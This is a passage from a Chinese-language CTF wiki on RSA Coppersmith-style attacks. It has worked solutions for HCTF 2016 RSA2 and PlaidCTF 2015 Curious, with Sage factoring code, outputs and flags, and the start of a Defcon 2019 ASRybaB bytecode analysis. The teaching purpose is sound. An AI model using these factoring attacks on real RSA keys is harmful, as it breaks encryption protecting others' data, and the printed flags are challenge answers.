key\uff0c\u6240\u4ee5\u53ea\u8981\u6211\u4eec\u6709\u5bc6\u6587\u5c31\u53ef\u4ee5\u89e3\u5bc6\u3002\u6b64\u5916\uff0c\u53ef\u4ee5\u770b\u5230\u7684\u662f\u7a0b\u5e8f\u662f\u5bf9\u4f20\u5165\u7684\u6d88\u606f\u8fdb\u884c 8 \u5b57\u8282\u5206\u7ec4\uff0c\u91c7\u7528\u5bc6\u7801\u672c\u65b9\u5f0f\u52a0\u5bc6\uff0c\u6240\u4ee5\u5bc6\u6587\u4e4b\u95f4\u4e92\u4e0d\u5f71\u54cd\u3002</p> <p>\u4e0b\u9762</p> <pre><code>    n = bytes_to_long(long_to_bytes(t) + long_to_bytes(u) + long_to_bytes(y))\n    q = n / p\n    if q % 2 == 0:\n        q += 1\n    while True:\n        if isPrime(q) and gcd(e, q-1) == 1:\n            break\n        m = getPrime(k/16) + 1\n        q ^= m\n    return (p, q, e)\n</code></pre> <p>\u7a0b\u5e8f\u5c06 t\uff0cu\uff0cy \u62fc\u63a5\u5728\u4e00\u8d77\u5f97\u5230 n\uff0c\u8fdb\u800c\uff0c\u7a0b\u5e8f\u5f97\u5230\u4e86 q\uff0c\u5e76\u5bf9 q \u7684\u4f4e k/16 \u4f4d\u505a\u4e86\u6291\u6216\uff0c\u7136\u540e\u8fd4\u56de <code>q'</code>\u3002</p> <p>\u5728\u4e3b\u7a0b\u5e8f\u91cc\uff0c\u518d\u4e00\u6b21\u5f97\u5230\u4e86 <code>n'=p*q'</code>\u3002\u8fd9\u91cc\u6211\u4eec\u4ed4\u7ec6\u5206\u6790\u4e00\u4e0b</p> <pre><code>n'=p * ( q + random(2^{k/16}))\n</code></pre> <p>\u800c p \u662f k/2 \u4f4d\u7684\uff0c\u6240\u4ee5\u8bf4\uff0crandom \u7684\u90e8\u5206\u6700\u591a\u53ef\u4ee5\u5f71\u54cd\u539f\u6765\u7684 n \u7684\u6700\u4f4e\u7684 k/2+k/16=9k/16 \u6bd4\u7279\u4f4d\u3002</p> <p>\u800c\uff0c\u6211\u4eec\u8fd8\u77e5\u9053 n \u7684\u6700\u4f4e\u7684 5k/8=10k/16 \u6bd4\u7279\u4e3a\u5176\u5b9e\u5c31\u662f y\uff0c\u6240\u4ee5\u5176\u5e76\u6ca1\u6709\u5f71\u54cd\u5230 u\uff0c\u5373\u4f7f\u5f71\u54cd\u5230\u4e5f\u5c31\u6700\u591a\u5f71\u54cd\u5230\u4e00\u4f4d\u3002</p> <p>\u6240\u4ee5\u6211\u4eec\u9996\u5148\u53ef\u4ee5\u5229\u7528\u6211\u4eec\u5f97\u5230\u7684 n \u6765\u83b7\u53d6 u\uff0c\u5982\u4e0b</p> <pre><code>u=hex(n)[2:-1][-480:-320]\n</code></pre> <p>\u867d\u7136\uff0c\u8fd9\u6837\u53ef\u80fd\u4f1a\u83b7\u5f97\u8f83\u591a\u4f4d\u6570\u7684 u\uff0c\u4f46\u662f\u8fd9\u6837\u5e76\u4e0d\u5f71\u54cd\uff0c\u6211\u4eec\u5bf9 u \u89e3\u5bc6\u7684\u65f6\u5019\u6bcf\u4e00\u5206\u7ec4\u90fd\u4e92\u4e0d\u5f71\u54cd\uff0c\u6240\u4ee5\u6211\u4eec\u53ea\u53ef\u80fd\u5f71\u54cd\u6700\u9ad8\u4f4d\u6570\u7684 p4\u3002\u800c p4 \u7684\u7684\u9ad8 8 \u4f4d\u4e5f\u6709\u53ef\u80fd\u662f\u586b\u5145\u7684\u3002\u4f46\u8fd9\u4e5f\u5e76\u4e0d\u5f71\u54cd\uff0c\u6211\u4eec\u5df2\u7ecf\u5f97\u5230\u4e86\u56e0\u5b50 p \u7684\u7684\u5f88\u591a\u90e8\u5206\u4e86\uff0c\u6211\u4eec\u53ef\u4ee5\u53bb\u5c1d\u8bd5\u7740\u89e3\u5bc6\u4e86\u3002\u5982\u4e0b</p> <pre><code>if __name__==\"__main__\":\n    n = 0x724d41149e1bd9d2aa9b333d467f2dfa399049a5d0b4ee770c9d4883123be11a52ff1bd382ad37d0ff8d58c8224529ca21c86e8a97799a31ddebd246aeeaf0788099b9c9c718713561329a8e529dfeae993036921f036caa4bdba94843e0a2e1254c626abe54dc3129e2f6e6e73bbbd05e7c6c6e9f44fcd0a496f38218ab9d52bf1f266004180b6f5b9bee7988c4fe5ab85b664280c3cfe6b80ae67ed8ba37825758b24feb689ff247ee699ebcc4232b4495782596cd3f29a8ca9e0c2d86ea69372944d027a0f485cea42b74dfd74ec06f93b997a111c7e18017523baf0f57ae28126c8824bd962052623eb565cee0ceee97a35fd8815d2c5c97ab9653c4553f\n    u = hex(n)[2:-1][-480:-320]\n    u = int(u,16)\n    p4 = pi_b(u,0)\n    print hex(p4)\n</code></pre> <p>\u89e3\u5bc6\u7ed3\u679c\u5982\u4e0b</p> <pre><code>\u279c  2016-HCTF-RSA2 git:(master) \u2717 python exp_p4.py\n0xa37302107c17fb4ef5c3443f4ef9e220ac659670077b9aa9ff7381d11073affe9183e88acae0ab61fb75a3c7815ffcb1b756b27c4d90b2e0ada753fa17cc108c1d0de82c747db81b9e6f49bde1362693L\n</code></pre> <p>\u4e0b\u9762\uff0c\u6211\u4eec\u76f4\u63a5\u4f7f\u7528 sage \u6765\u89e3\u5bc6\uff0c\u8fd9\u91cc sage \u91cc\u9762\u5df2\u7ecf\u5b9e\u73b0\u4e86\u8fd9\u4e2a\u653b\u51fb\uff0c\u6211\u4eec\u76f4\u63a5\u62ff\u6765\u7528\u5c31\u597d</p> <pre><code>from sage.all import *\nimport binascii\nn = 0x724d41149e1bd9d2aa9b333d467f2dfa399049a5d0b4ee770c9d4883123be11a52ff1bd382ad37d0ff8d58c8224529ca21c86e8a97799a31ddebd246aeeaf0788099b9c9c718713561329a8e529dfeae993036921f036caa4bdba94843e0a2e1254c626abe54dc3129e2f6e6e73bbbd05e7c6c6e9f44fcd0a496f38218ab9d52bf1f266004180b6f5b9bee7988c4fe5ab85b664280c3cfe6b80ae67ed8ba37825758b24feb689ff247ee699ebcc4232b4495782596cd3f29a8ca9e0c2d86ea69372944d027a0f485cea42b74dfd74ec06f93b997a111c7e18017523baf0f57ae28126c8824bd962052623eb565cee0ceee97a35fd8815d2c5c97ab9653c4553f\np4 =0xa37302107c17fb4ef5c3443f4ef9e220ac659670077b9aa9ff7381d11073affe9183e88acae0ab61fb75a3c7815ffcb1b756b27c4d90b2e0ada753fa17cc108c1d0de82c747db81b9e6f49bde1362693\ncipher = 0xf11e932fa420790ca3976468dc4df1e6b20519ebfdc427c09e06940e1ef0ca566d41714dc1545ddbdcae626eb51c7fa52608384a36a2a021960d71023b5d0f63e6b38b46ac945ddafea42f01d24cc33ce16825df7aa61395d13617ae619dca2df15b5963c77d6ededf2fe06fd36ae8c5ce0e3c21d72f2d7f20cd9a8696fbb628df29299a6b836c418cbfe91e2b5be74bdfdb4efdd1b33f57ebb72c5246d5dce635529f1f69634d565a631e950d4a34a02281cbed177b5a624932c2bc02f0c8fd9afd332ccf93af5048f02b8bd72213d6a52930b0faa0926973883136d8530b8acf732aede8bb71cb187691ebd93a0ea8aeec7f82d0b8b74bcf010c8a38a1fa8\ne2 = 0xf93b\npbits = 1024\nkbits = pbits - p4.nbits()\nprint p4.nbits()\np4 = p4 &lt;&lt; kbits\nPR.&lt;x&gt; = PolynomialRing(Zmod(n))\nf = x + p4\nroots = f.small_roots(X=2^kbits, beta=0.4)\nif roots:\n    p = p4+int(roots[0])\n    print \"p: \", hex(int(p))\n    assert n % p == 0\n    q = n/int(p)\n    print \"q: \", hex(int(q))\n    print gcd(p,q)\n    phin = (p-1)*(q-1)\n    print gcd(e2,phin)\n    d = inverse_mod(e2,phin)\n    flag = pow(cipher,d,n)\n    flag = hex(int(flag))[2:-1]\n    print binascii.unhexlify(flag)\n</code></pre> <p>\u5173\u4e8e <code>small_roots</code> \u7684\u4f7f\u7528\uff0c\u53ef\u4ee5\u53c2\u8003 SAGE \u8bf4\u660e\u3002</p> <p>\u7ed3\u679c\u5982\u4e0b</p> <pre><code>\u279c  2016-HCTF-RSA2 git:(master) \u2717 sage payload.sage\nsys:1: RuntimeWarning: not adding directory '' to sys.path since everybody can write to it.\nUntrusted users could put files in this directory which might then be imported by your Python code. As a general precaution from similar exploits, you should not execute Python code from this directory\n640\np:  0xa37302107c17fb4ef5c3443f4ef9e220ac659670077b9aa9ff7381d11073affe9183e88acae0ab61fb75a3c7815ffcb1b756b27c4d90b2e0ada753fa17cc108c1d0de82c747db81b9e6f49bde13626933aa6762057e1df53d27356ee6a09b17ef4f4986d862e3bb24f99446a0ab2385228295f4b776c1f391ab2a0d8c0dec1e5L\nq:  0xb306030a7c6ace771db8adb45fae597f3c1be739d79fd39dfa6fd7f8c177e99eb29f0462c3f023e0530b545df6e656dadb984953c265b26f860b68aa6d304fa403b0b0e37183008592ec2a333c431e2906c9859d7cbc4386ef4c4407ead946d855ecd6a8b2067ad8a99b21111b26905fcf0d53a1b893547b46c3142b06061853L\n1\n1\nhctf{d8e8fca2dc0f896fd7cb4cb0031ba249}\n</code></pre>"},{"location":"crypto/asymmetric/rsa/rsa_coppersmith_attack/#_15","title":"\u9898\u76ee","text":"<ul> <li>2016 \u6e56\u6e58\u676f \u7b80\u5355\u7684 RSA</li> <li>2017 WHCTF Untitled</li> </ul>"},{"location":"crypto/asymmetric/rsa/rsa_coppersmith_attack/#boneh-and-durfee-attack","title":"Boneh and Durfee attack","text":""},{"location":"crypto/asymmetric/rsa/rsa_coppersmith_attack/#_16","title":"\u653b\u51fb\u6761\u4ef6","text":"<p>\u5f53 d \u8f83\u5c0f\u65f6\uff0c\u6ee1\u8db3 d &lt; N^{0.292} \u65f6\uff0c\u6211\u4eec\u53ef\u4ee5\u5229\u7528\u8be5\u653b\u51fb\uff0c\u6bd4 Wiener's Attack \u8981\u5f3a\u4e00\u4e9b\u3002</p>"},{"location":"crypto/asymmetric/rsa/rsa_coppersmith_attack/#_17","title":"\u653b\u51fb\u539f\u7406","text":"<p>\u8fd9\u91cc\u7b80\u5355\u8bf4\u4e00\u4e0b\u539f\u7406\u3002</p> <p>\u9996\u5148</p>  ed \\equiv 1 \\bmod  \\varphi(N)/2  <p>\u8fdb\u800c\u6709</p>  ed +k\\varphi(N)/2=1  <p>\u5373</p>  k \\varphi(N)/2 \\equiv 1 \\bmod e  <p>\u53c8</p>  \\varphi(N)=(p-1)(q-1)=qp-p-q+1=N-p-q+1  <p>\u6240\u4ee5</p>  k(N-p-q+1)/2 \\equiv 1 \\bmod e  <p>\u5047\u8bbe A=\\frac{N+1}{2}\uff0cy=\\frac{-p-q}{2} \uff0c\u539f\u5f0f\u53ef\u5316\u4e3a</p>  f(k,y)=k(A+y) \\equiv 1 \\bmod e  <p>\u5176\u4e2d</p> <p>|k|&lt;\\frac{2ed}{\\varphi(N)}&lt;\\frac{3ed}{N}=3*\\frac{e}{N}*d&lt;3*\\frac{e}{N}*N^{delta}</p> <p>|y|&lt;2*N^{0.5}</p> <p>y \u7684\u4f30\u8ba1\u7528\u5230\u4e86 p\u3001q \u6bd4\u8f83\u5747\u5300\u7684\u5047\u8bbe\u3002\u8fd9\u91cc delta \u4e3a\u9884\u4f30\u7684\u5c0f\u4e8e 0.292 \u7684\u503c\u3002</p> <p>\u5982\u679c\u6211\u4eec\u6c42\u5f97\u4e86\u8be5\u4e8c\u5143\u65b9\u7a0b\u7684\u6839\uff0c\u90a3\u4e48\u6211\u4eec\u81ea\u7136\u4e5f\u5c31\u53ef\u4ee5\u89e3\u4e00\u5143\u4e8c\u6b21\u65b9\u7a0b N=pq,p+q=-2y \u6765\u5f97\u5230 p \u4e0e q\u3002</p> <p>\u66f4\u52a0\u5177\u4f53\u7684\u63a8\u5bfc\uff0c\u53c2\u8003 New Results on the Cryptanalysis of Low Exponent RSA.</p>"},{"location":"crypto/asymmetric/rsa/rsa_coppersmith_attack/#_18","title":"\u653b\u51fb\u5de5\u5177","text":"<p>\u8bf7\u53c2\u8003 https://github.com/mimoo/RSA-and-LLL-attacks \u3002\u4e0a\u9762\u6709\u4f7f\u7528\u6559\u7a0b\u3002</p>"},{"location":"crypto/asymmetric/rsa/rsa_coppersmith_attack/#2015-plaidctf-curious","title":"2015 PlaidCTF Curious","text":"<p>\u8fd9\u91cc\u6211\u4eec\u4ee5 2015 \u5e74 PlaidCTF Curious \u4e3a\u4f8b\u8fdb\u884c\u4ecb\u7ecd\u3002</p> <p>\u9996\u5148\u9898\u76ee\u7ed9\u4e86\u4e00\u5806 N\uff0ce\uff0cc\u3002\u7b80\u5355\u770b\u4e00\u4e0b\u53ef\u4ee5\u53d1\u73b0\u8be5 e \u6bd4\u8f83\u5927\u3002\u8fd9\u65f6\u5019\u6211\u4eec\u53ef\u4ee5\u8003\u8651\u4f7f\u7528 Wiener's Attack\uff0c\u8fd9\u91cc\u6211\u4eec\u4f7f\u7528\u66f4\u5f3a\u7684\u76ee\u524d\u4ecb\u7ecd\u7684\u653b\u51fb\u3002</p> <p>\u6838\u5fc3\u4ee3\u7801\u5982\u4e0b</p> <pre><code>    nlist = list()\n    elist = list()\n    clist = list()\n    with open('captured') as f:\n        # read the line {N : e : c} and do nothing with it\n        f.readline()\n        for i in f.readlines():\n            (N, e, c) = i[1:-2].split(\" : \")\n            nlist.append(long(N,16))\n            elist.append(long(e,16))\n            clist.append(long(c,16))\n\n    for i in range(len(nlist)):\n        print 'index i'\n        n = nlist[i]\n        e = elist[i]\n        c = clist[i]\n        d = solve(n,e)\n        if d==0:\n            continue\n        else:\n            m = power_mod(c, d, n)\n            hex_string = \"%x\" % m\n            import binascii\n            print \"the plaintext:\", binascii.unhexlify(hex_string)\n            return\n</code></pre> <p>\u7ed3\u679c\u5982\u4e0b</p> <pre><code>=== solution found ===\nprivate key found: 23974584842546960047080386914966001070087596246662608796022581200084145416583\nthe plaintext: flag_S0Y0UKN0WW13N3R$4TT4CK!\n</code></pre>"},{"location":"crypto/asymmetric/rsa/rsa_coppersmith_attack/#2019-defcon-quals-asrybab","title":"2019 Defcon Quals ASRybaB","text":"<p>\u9898\u76ee\u5927\u6982\u610f\u601d\u662f\uff0c\u6211\u4eec\u63a5\u6536\u4e09\u5bf9 RSA \uff0c\u7136\u540e\u9700\u8981\u6c42\u51fa d\uff0c\u7136\u540e\u5bf9\u7ed9\u5b9a\u7684\u6570\u5b57 v[i] \u52a0\u5bc6\uff0c\u53d1\u9001\u7ed9\u670d\u52a1\u5668\uff0c\u53ea\u8981\u65f6\u95f4\u5728\u4e00\u5b9a\u8303\u56f4\u5185\uff0c940s\uff0c\u5373\u53ef\u3002\u90a3\u96be\u70b9\u81ea\u7136\u5728 create_key \u51fd\u6570\u4e86\u3002</p> <pre><code>def send_challenges():\n\n    code = marshal.loads(\"63000000000d000000070000004300000073df010000740000721d0064010064020015000000000100640200157d00006e00007401007d01007c0100640300157d02006402007d0300786f007c03006a02008300007c01006b030072a400784c007403007296007404006a05007c02008301007d04007404006a05007c02008301007d05007406007c04007c0500188301006a02008300007c0100640400146b0400724b0050714b00714b00577c04007c0500147d0300713600577c0400640500187c050064050018147d06006406007d07006407007d080078090174030072ce017404006a07007408006403007409007c01007c0700148301008302007408006403007409007c01007c070014830100640500178302008302007d09007871007c09006a02008300007c01007c0800146b0000727b016402007d0a007844007404006a0a007c0a00830100736d017404006a0700740800640300640800830200740800640300640800830200740800640300640900830200178302007d0a00712a01577c09007c0a00397d0900710b01577404006a0b007c09007c06008302006405006b0300729a0171c6006e00007404006a0c007c09007c06008302007d0b007404006a0b007c0b007c06008302006405006b030072ca0171c6006e00005071c60057640a007d0c007c03007c0b0066020053280b0000004e690700000069000000006902000000675839b4c876bedf3f6901000000674e62105839b4d03f678d976e1283c0d23f692d000000690c0000006903000000280d000000740500000046616c736574050000004e53495a45740a0000006269745f6c656e67746874040000005472756574060000006e756d626572740e0000006765745374726f6e675072696d657403000000616273740e00000067657452616e646f6d52616e67657403000000706f777403000000696e74740700000069735072696d6574030000004743447407000000696e7665727365280d00000074010000007874050000004e73697a657406000000707173697a6574010000004e740100000070740100000071740300000070686974060000006c696d69743174060000006c696d697432740100000064740300000070707074010000006574030000007a7a7a2800000000280000000073150000002f6f726967696e616c6368616c6c656e67652e7079740a0000006372656174655f6b657917000000733e000000000106010a010d0206010a010601150109010f010f04200108010e0112020601060109013c0119010601120135020e011801060112011801060105020604\".decode(\"hex\"))\n    create_key = types.FunctionType(code, globals(), \"create_key\")\n\n    ck = create_key\n</code></pre> <p>\u6211\u4eec\u53ef\u4ee5\u7b80\u5355\u770b\u770b\u8fd9\u4e2a\u5230\u5e95\u662f\u5728\u5e72\u5565</p> <pre><code>&gt;&gt;&gt; import marshal\n&gt;&gt;&gt; data=\"63000000000d000000070000004300000073df010000740000721d0064010064020015000000000100640200157d00006e00007401007d01007c0100640300157d02006402007d0300786f007c03006a02008300007c01006b030072a400784c007403007296007404006a05007c02008301007d04007404006a05007c02008301007d05007406007c04007c0500188301006a02008300007c0100640400146b0400724b0050714b00714b00577c04007c0500147d0300713600577c0400640500187c050064050018147d06006406007d07006407007d080078090174030072ce017404006a07007408006403007409007c01007c0700148301008302007408006403007409007c01007c070014830100640500178302008302007d09007871007c09006a02008300007c01007c0800146b0000727b016402007d0a007844007404006a0a007c0a00830100736d017404006a0700740800640300640800830200740800640300640800830200740800640300640900830200178302007d0a00712a01577c09007c0a00397d0900710b01577404006a0b007c09007c06008302006405006b0300729a0171c6006e00007404006a0c007c09007c06008302007d0b007404006a0b007c0b007c06008302006405006b030072ca0171c6006e00005071c60057640a007d0c007c03007c0b0066020053280b0000004e690700000069000000006902000000675839b4c876bedf3f6901000000674e62105839b4d03f678d976e1283c0d23f692d000000690c0000006903000000280d000000740500000046616c736574050000004e53495a45740a0000006269745f6c656e67746874040000005472756574060000006e756d626572740e0000006765745374726f6e675072696d657403000000616273740e00000067657452616e646f6d52616e67657403000000706f777403000000696e74740700000069735072696d6574030000004743447407000000696e7665727365280d00000074010000007874050000004e73697a657406000000707173697a6574010000004e740100000070740100000071740300000070686974060000006c696d69743174060000006c696d697432740100000064740300000070707074010000006574030000007a7a7a2800000000280000000073150000002f6f726967696e616c6368616c6c656e67652e7079740a0000006372656174655f6b657917000000733e000000000106010a010d0206010a010601150109010f010f04200108010e0112020601060109013c0119010601120135020e011801060112011801060105020604\"\n&gt;&gt;&gt; code=marshal.loads(data)\n&gt;&gt;&gt; code=marshal.loads(data.decode('hex'))\n&gt;&gt;&gt; import dis\n&gt;&gt;&gt; dis.dis(code)\n 24           0 LOAD_GLOBAL              0 (False)\n              3 POP_JUMP_IF_FALSE       29\n\n 25           6 LOAD_CONST               1 (7)\n              9 LOAD_CONST               2 (0)\n             12 BINARY_DIVIDE\n             13 STOP_CODE\n             14 STOP_CODE\n             15 STOP_CODE\n...\n 56         428 LOAD_GLOBAL              4 (number)\n            431 LOAD_ATTR               11 (GCD)\n            434 LOAD_FAST               11 (e)\n            437 LOAD_FAST                6 (phi)\n            440 CALL_FUNCTION            2\n            443 LOAD_CONST               5 (1)\n            446 COMPARE_OP               3 (!=)\n            449 POP_JUMP_IF_FALSE      458\n...\n</code></pre> <p>\u57fa\u672c\u53ef\u4ee5\u731c\u51fa\u6765\u8fd9\u662f\u5728\u751f\u6210 n\uff0ce\uff0cd\uff0c\u5176\u5b9e\u548c\u6211\u4eec\u6700\u521d\u7684\u9884\u671f\u4e5f\u5dee\u4e0d\u591a\u3002\u6211\u4eec\u6765\u76f4\u63a5\u53cd\u7f16\u8bd1\u4e00\u4e0b</p> <pre><code>&gt;&gt;&gt; from uncompyle6 import code_deparse\n&gt;&gt;&gt; code_deparse(code)\nInstruction context:\n\n  25       6  LOAD_CONST            1  7\n              9  LOAD_CONST            2  0\n             12  BINARY_DIVIDE\n-&gt;           13  STOP_CODE\n             14  STOP_CODE\n             15  STOP_CODE\nTraceback (most recent call last):\n  File \"&lt;stdin&gt;\", line 1, in &lt;module&gt;\n  File \"/usr/local/lib/python2.7/site-packages/uncompyle6/semantics/pysource.py\", line 2310, in code_deparse\n    deparsed.ast = deparsed.build_ast(tokens, customize, isTopLevel=isTopLevel)\n  File \"/usr/local/lib/python2.7/site-packages/uncompyle6/semantics/pysource.py\", line 2244, in build_ast\n    raise ParserError(e, tokens)\nuncompyle6.semantics.parser_error.ParserError: --- This code section failed: ---\n...\n 64     469  LOAD_FAST             3  'N'\n         472  LOAD_FAST            11  'e'\n         475  BUILD_TUPLE_2         2  None\n         478  RETURN_VALUE\n          -1  RETURN_LAST\n\nParse error at or near `STOP_CODE' instruction at offset 13\n</code></pre> <p>\u53ef\u4ee5\u53d1\u73b0 STOP_CODE\uff0c\u6709\u70b9\u732b\u817b\uff0c\u5982\u679c\u4ed4\u7ec6\u770b\u6700\u521d\u7684\u53cd\u6c47\u7f16\u7684\u8bdd\uff0c\u6211\u4eec\u53ef\u4ee5\u53d1\u73b0\u6700\u524d\u9762\u7684\u90a3\u90e8\u5206\u4ee3\u7801\u662f\u5728\u6df7\u6dc6</p> <pre><code>&gt;&gt;&gt; dis.dis(code)\n 24           0 LOAD_GLOBAL              0 (False)\n              3 POP_JUMP_IF_FALSE       29\n\n 25           6 LOAD_CONST               1 (7)\n              9 LOAD_CONST               2 (0)\n             12 BINARY_DIVIDE\n             13 STOP_CODE\n             14 STOP_CODE\n             15 STOP_CODE\n\n 26          16 STOP_CODE\n             17 POP_TOP\n             18 STOP_CODE\n             19 LOAD_CONST               2 (0)\n             22 BINARY_DIVIDE\n             23 STORE_FAST               0 (x)\n             26 JUMP_FORWARD             0 (to 29)\n\n 28     &gt;&gt;   29 LOAD_GLOBAL              1 (NSIZE)\n             32 STORE_FAST               1 (Nsize)\n\n 29          35 LOAD_FAST                1 (Nsize)\n             38 LOAD_CONST               3 (2)\n             41 BINARY_DIVIDE\n             42 STORE_FAST               2 (pqsize)\n</code></pre> <p>\u4e00\u76f4\u5230</p> <pre><code> 29          35 LOAD_FAST                1 (Nsize)\n</code></pre> <p>\u524d\u9762\u7684\u90fd\u6ca1\u6709\u4ec0\u4e48\u4f5c\u7528\uff0c\u611f\u89c9\u662f\u51fa\u9898\u8005\u6545\u610f\u4fee\u6539\u4e86\u4ee3\u7801\u3002\u4ed4\u7ec6\u5206\u6790\u4e00\u4e0b\u8fd9\u90e8\u5206\u4ee3\u7801\uff0c\u611f\u89c9\u50cf\u662f\u4e24\u90e8\u5206</p> <pre><code># part 1\n 25           6 LOAD_CONST               1 (7)\n              9 LOAD_CONST               2 (0)\n             12 BINARY_DIVIDE\n             13 STOP_CODE\n             14 STOP_CODE\n             15 STOP_CODE\n# part 2\n 26          16 STOP_CODE\n             17 POP_TOP\n             18 STOP_CODE\n             19 LOAD_CONST               2 (0)\n             22 BINARY_DIVIDE\n             23 STORE_FAST               0 (x)\n             26 JUMP_FORWARD             0 (to 29)\n</code></pre> <p>\u6b63\u597d\u662f\u7b2c 25 \u884c\u548c\u7b2c 26 \u884c\uff0c\u5927\u6982\u731c\u4e00\u731c\uff0c\u611f\u89c9\u4e24\u4e2a\u90fd\u662f x=7/0\uff0c\u6240\u4ee5\u5c31\u60f3\u529e\u6cd5\u628a\u8fd9\u90e8\u5206\u7684\u4ee3\u7801\u4fee\u590d\u4e00\u4e0b\uff0c\u63a5\u4e0b\u6765\u5c31\u662f\u5b9a\u4f4d\u8fd9\u90e8\u5206\u4ee3\u7801\u4e86\u3002\u6839\u636e\u624b\u518c\u53ef\u4ee5\u77e5\u9053 STOP_CODE \u662f 0\uff0c\u4ece\u800c\u6211\u4eec\u53ef\u4ee5\u5b9a\u4f4d\u7b2c 25 \u884c\u8bed\u53e5\u5230 26 \u884c\u8bed\u53e5\u4e3a t[6:26]\uff0c\u4ed6\u4eec\u5206\u522b\u90fd\u662f 10 \u5b57\u8282(6-15,16-25)\u3002</p> <pre><code>&gt;&gt;&gt; t=code.co_code\n&gt;&gt;&gt; t\n't\\x00\\x00r\\x1d\\x00d\\x01\\x00d\\x02\\x00\\x15\\x00\\x00\\x00\\x00\\x01\\x00d\\x02\\x00\\x15}\\x00\\x00n\\x00\\x00t\\x01\\x00}\\x01\\x00|\\x01\\x00d\\x03\\x00\\x15}\\x02\\x00d\\x02\\x00}\\x03\\x00xo\\x00|\\x03\\x00j\\x02\\x00\\x83\\x00\\x00|\\x01\\x00k\\x03\\x00r\\xa4\\x00xL\\x00t\\x03\\x00r\\x96\\x00t\\x04\\x00j\\x05\\x00|\\x02\\x00\\x83\\x01\\x00}\\x04\\x00t\\x04\\x00j\\x05\\x00|\\x02\\x00\\x83\\x01\\x00}\\x05\\x00t\\x06\\x00|\\x04\\x00|\\x05\\x00\\x18\\x83\\x01\\x00j\\x02\\x00\\x83\\x00\\x00|\\x01\\x00d\\x04\\x00\\x14k\\x04\\x00rK\\x00PqK\\x00qK\\x00W|\\x04\\x00|\\x05\\x00\\x14}\\x03\\x00q6\\x00W|\\x04\\x00d\\x05\\x00\\x18|\\x05\\x00d\\x05\\x00\\x18\\x14}\\x06\\x00d\\x06\\x00}\\x07\\x00d\\x07\\x00}\\x08\\x00x\\t\\x01t\\x03\\x00r\\xce\\x01t\\x04\\x00j\\x07\\x00t\\x08\\x00d\\x03\\x00t\\t\\x00|\\x01\\x00|\\x07\\x00\\x14\\x83\\x01\\x00\\x83\\x02\\x00t\\x08\\x00d\\x03\\x00t\\t\\x00|\\x01\\x00|\\x07\\x00\\x14\\x83\\x01\\x00d\\x05\\x00\\x17\\x83\\x02\\x00\\x83\\x02\\x00}\\t\\x00xq\\x00|\\t\\x00j\\x02\\x00\\x83\\x00\\x00|\\x01\\x00|\\x08\\x00\\x14k\\x00\\x00r{\\x01d\\x02\\x00}\\n\\x00xD\\x00t\\x04\\x00j\\n\\x00|\\n\\x00\\x83\\x01\\x00sm\\x01t\\x04\\x00j\\x07\\x00t\\x08\\x00d\\x03\\x00d\\x08\\x00\\x83\\x02\\x00t\\x08\\x00d\\x03\\x00d\\x08\\x00\\x83\\x02\\x00t\\x08\\x00d\\x03\\x00d\\t\\x00\\x83\\x02\\x00\\x17\\x83\\x02\\x00}\\n\\x00q*\\x01W|\\t\\x00|\\n\\x009}\\t\\x00q\\x0b\\x01Wt\\x04\\x00j\\x0b\\x00|\\t\\x00|\\x06\\x00\\x83\\x02\\x00d\\x05\\x00k\\x03\\x00r\\x9a\\x01q\\xc6\\x00n\\x00\\x00t\\x04\\x00j\\x0c\\x00|\\t\\x00|\\x06\\x00\\x83\\x02\\x00}\\x0b\\x00t\\x04\\x00j\\x0b\\x00|\\x0b\\x00|\\x06\\x00\\x83\\x02\\x00d\\x05\\x00k\\x03\\x00r\\xca\\x01q\\xc6\\x00n\\x00\\x00Pq\\xc6\\x00Wd\\n\\x00}\\x0c\\x00|\\x03\\x00|\\x0b\\x00f\\x02\\x00S'\n&gt;&gt;&gt; t[6:26]\n'd\\x01\\x00d\\x02\\x00\\x15\\x00\\x00\\x00\\x00\\x01\\x00d\\x02\\x00\\x15}\\x00\\x00'\n&gt;&gt;&gt; t[-3:]\n'\\x02\\x00S'\n&gt;&gt;&gt; t='d\\x01\\x00d\\x02\\x00\\x15\\x00\\x00\\x00\\x00\\x01\\x00d\\x02\\x00\\x15}\\x00\\x00'\n&gt;&gt;&gt; t[-3:]\n'}\\x00\\x00'\n&gt;&gt;&gt; t[:7]+t[-3:]\n'd\\x01\\x00d\\x02\\x00\\x15}\\x00\\x00'\n&gt;&gt;&gt; _.encode('hex')\n'640100640200157d0000'\n</code></pre> <p>\u4ece\u800c\u6211\u4eec\u53ef\u4ee5\u4fee\u590d\u539f code</p> <pre><code>&gt;&gt;&gt; data.find('640100')\n56\n&gt;&gt;&gt; data1=data[:56]+'640100640200157d0000640100640200157d0000'+data[56+40:]\n&gt;&gt;&gt; code1=marshal.loads(data1.decode('hex'))\n&gt;&gt;&gt; code_deparse(code1)\nif False:\n    x = 7 / 0\n    x = 7 / 0\nNsize = NSIZE\npqsize = Nsize / 2\nN = 0\nwhile N.bit_length() != Nsize:\n    while True:\n        p = number.getStrongPrime(pqsize)\n        q = number.getStrongPrime(pqsize)\n        if abs(p - q).bit_length() &gt; Nsize * 0.496:\n            break\n\n    N = p * q\n\nphi = (p - 1) * (q - 1)\nlimit1 = 0.261\nlimit2 = 0.293\nwhile True:\n    d = number.getRandomRange(pow(2, int(Nsize * limit1)), pow(2, int(Nsize * limit1) + 1))\n    while d.bit_length() &lt; Nsize * limit2:\n        ppp = 0\n        while not number.isPrime(ppp):\n            ppp = number.getRandomRange(pow(2, 45), pow(2, 45) + pow(2, 12))\n\n        d *= ppp\n\n    if number.GCD(d, phi) != 1:\n        continue\n    e = number.inverse(d, phi)\n    if number.GCD(e, phi) != 1:\n        continue\n    break\n\nzzz = 3\nreturn (\n N, e)&lt;uncompyle6.semantics.pysource.SourceWalker object at 0x10a0ea110&gt;\n</code></pre> <p>\u53ef\u4ee5\u770b\u5230\u751f\u6210\u7684 d \u662f\u6545\u610f\u8d85\u4e86 0.292 \u7684\uff0c\u4e0d\u8fc7\u6211\u4eec\u53ef\u4ee5\u53d1\u73b0 ppp \u8303\u56f4\u5f88\u5c0f\uff0c\u5b9e\u9645\u4e0a\u6211\u4eec\u53ef\u4ee5\u6d4b\u8bd5\u5f97\u5230\u8fd9\u4e2a\u8303\u56f4\u7684\u7d20\u6570\u4e3a 125 \u4e2a\u3002\u5e76\u4e14</p> <pre><code>1280*0.261+45=379.08000000000004&gt;375.03999999999996=1280*0.293\n</code></pre> 